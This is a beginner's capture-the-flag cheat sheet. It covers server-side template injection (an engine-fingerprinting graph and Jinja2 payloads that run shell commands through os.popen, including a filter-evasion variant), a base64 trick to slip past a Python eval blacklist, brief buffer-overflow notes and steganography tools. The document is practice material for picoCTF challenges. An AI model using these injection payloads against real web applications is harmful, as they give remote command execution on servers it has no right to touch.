# Beginner's Guide to CTF

I.e a guide by a beginner, not whatever else you thought.

# Web Exploitation

## Injection

### SSTI (Server-Side Template Injection)

Test inputs with the string: `${{<%[%'"}}%\`. If this causes the page to have an error, input is not correctly sanitised and we may be able to progress.

If we're lucky, this spat out an error telling us which version of which templating engine is in use. If not, we can narrow it down:

```mermaid
graph LR;
	id1[${7 * 7}]
	id2[${a{*comment*}b]
	id3[{{7 * 7}}]
	id4[Smarty]
	id5[${"z".join("ab")}]
	id6[{{7 * '7'}}]
	id7[Not Vulnerable]
	id8[Mako]
	id9[Unknown]
	id10[Jinja2]
	id11[Twig]

	id1 e1@--> id2
	id1 e2@--> id3
	id2 e3@--> id4
	id2 e4@--> id5
	id3 e5@--> id6
	id3 e6@--> id7
	id5 e7@--> id8
	id5 e8@--> id9
	id6 e9@-->|7777777| id10
	id6 e10@-->|49| id11
	id6 e11@--> id9

	e1@ e3@ e5@ e7@ e9@ e10@ { stroke:#bfb; color: green }
	e2@ e4@ e6@ e8@ e11@ { stroke:#fbb; color red }
```

#### Case Study: Jinja2

From the above graph, identified that we are working with Jinja2.

Jinja is python-based templating, so the documentation is pretty scant. Some searching turned up the following:
* A `config` object and an `application` object are exposed to all templates.
* With no protections on it, that is enough!
```
{{config.__class__.__init__.globals()['os'].popen('ls -la').read()}}
{{config.__class__.__init__.globals()['os'].popen('cat flag').read()}}
```
* With filtering protections, it can get more hairy. picoCTF's SSTI2 is good practice here, as it filters out `[`, `]`, and `_`. It may also filter `.` outside of strings. We can use python's builtin .getitem() to avoid using [], and we can replace `_` with `\x5f` to deceive the filter. Finally, Jinja's |attr terminology allows us to avoid using `.` outside of a string.
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('grep picoCTF . -rnw')|attr('read')()}}
```

See also [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md).

### Bypassing ReGeX

Python eval function in the backend, blacklisted: `os`, `ls`, `.`, `/`, `eval`, `exec`, `\`.

Clever option here to base64 encode our tricksy bits (plaintext is `./flag.txt`):
```
open(__import__('base64').b64decode('L2ZsYWcudHh0').decode()).read() 
```

# Memory

Scanf does not have boundary checking. We can take advantage of this when freely allowed to choose input (see picoCTF's `Heap 0` question), by inputting something larger than the buffer being written to.

PIE can be annoying without access to the binary. With the binary, simply do `objdump -d <file>` to get rough positions of functions. Crucially, this will allow calculating position differences between them.

# Image Steganography

Not meaning just LSB-type steg, but also the generic art of hiding s@@@ in image files.

## CLI tools!

* stepic (webshell can be a little overeager terminating this for large images).
* steghide
* strings
* exiftool 
